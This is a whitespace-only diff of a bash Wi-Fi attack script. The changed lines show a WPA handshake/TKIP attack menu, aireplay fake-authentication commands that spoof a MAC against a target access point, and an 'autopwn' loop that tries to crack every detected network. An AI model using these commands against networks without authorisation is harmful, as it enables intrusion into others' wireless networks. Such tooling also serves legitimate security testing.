@@ -408,14 +408,14 @@ witchattack(){ monmode
 
 
     attackwpa(){
-while true; do
-$clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
-read n
-	case $n in
-		1) wpahandshake; $clear; break;;
-		2) tkiptunstdqos; $clear; break;;
-	esac
-done
+        while true; do
+            $clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
+            read n
+        	case $n in
+        		1) wpahandshake; $clear; break;;
+        		2) tkiptunstdqos; $clear; break;;
+        	esac
+        done
 	}
 
 	# 1 just capture
@@ -509,13 +509,13 @@ fi
 
 # Those are subproducts of choosefake
     fakeauth1(){
-        execute "Fake auth (1)" $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
+        execute "Fake auth (1) " $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
 	}
     fakeauth2(){
-        execute "Fake auth (2)" $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
+        execute "Fake auth (2) " $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
 	}
     fakeauth3(){
-        execute "Fake auth (3)" $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
+        execute "Fake auth (3) " $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi & menufonction
     }
 
 
@@ -856,10 +856,10 @@ doauto(){
             echo "Networks detected $MAX_TARGETS"; sleep 1
             for i in $MAX_TARGETS; do
                 echo "Trying to crack target: $i"
-    			Parseforap
-                sleep 1
+    			Parseforap;  sleep 1
+
                 if [ "$Host_SSID" != "" ]; then
-                autopwn
+                    autopwn
                 else
                     echo "Couldn't find essid, next try"
                 fi
